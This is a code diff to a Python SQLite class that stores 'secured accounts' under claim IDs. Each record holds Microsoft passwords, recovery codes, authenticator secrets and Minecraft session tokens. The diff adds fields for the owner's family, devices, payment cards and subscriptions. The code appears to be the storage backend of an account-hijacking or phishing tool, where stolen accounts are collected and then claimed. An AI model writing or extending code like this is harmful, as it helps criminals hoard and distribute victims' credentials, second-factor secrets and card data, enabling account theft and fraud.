@@ -1,4 +1,5 @@
 import sqlite3
+import json
 
 class DBConnection:
     def __init__(self) -> None:
@@ -40,6 +41,13 @@ class DBConnection:
                 ms_full_name TEXT,
                 ms_region TEXT,
                 ms_birthday TEXT,
+                ms_language TEXT,
+                ms_family TEXT,
+                ms_devices TEXT,
+                ms_cards TEXT,
+                ms_subscriptions_active TEXT,
+                ms_subscriptions_canceled TEXT,
+                ms_subscriptions_commercial TEXT,
                 mc_name TEXT,
                 mc_method TEXT,
                 mc_gamertag TEXT,
@@ -143,17 +151,22 @@ class DBConnection:
     def add_secured_account(self, claim_id: str, account: dict) -> None:
         ms = account["microsoft"]
         mc = account["minecraft"]
+        subs = ms["subscriptions"]
         self.cursor.execute("""
             INSERT INTO `secured_accounts` (
                 claim_id, claimed_by,
                 ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
-                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday,
+                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
+                ms_family, ms_devices, ms_cards,
+                ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                 mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
-            ) VALUES (?, NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ) VALUES (?, NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """, (
             claim_id,
             ms["email"], ms["security_email"], ms["password"], ms["recovery_code"], ms["auth_secret"],
-            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"],
+            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"], ms["language"],
+            json.dumps(ms["family"]), json.dumps(ms["devices"]), json.dumps(ms["cards"]),
+            json.dumps(subs["active"]), json.dumps(subs["canceled"]), json.dumps(subs["commercial"]),
             mc["name"], mc["method"], mc["gamertag"], mc["uchange"], mc["capes"], str(mc["SSID"])
         ))
         self.conn.commit()
@@ -182,16 +195,20 @@ class DBConnection:
     def get_secured_account(self, claim_id: str) -> dict | None:
         row = self.cursor.execute("""
             SELECT ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
-                   ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday,
+                   ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
+                   ms_family, ms_devices, ms_cards,
+                   ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                    mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
             FROM `secured_accounts` WHERE claim_id = ?
         """, (claim_id,)).fetchone()
-        
+
         if not row:
             return None
         keys = [
             "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
-            "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday",
+            "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday", "ms_language",
+            "ms_family", "ms_devices", "ms_cards",
+            "ms_subscriptions_active", "ms_subscriptions_canceled", "ms_subscriptions_commercial",
             "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid"
         ]
         return dict(zip(keys, row))
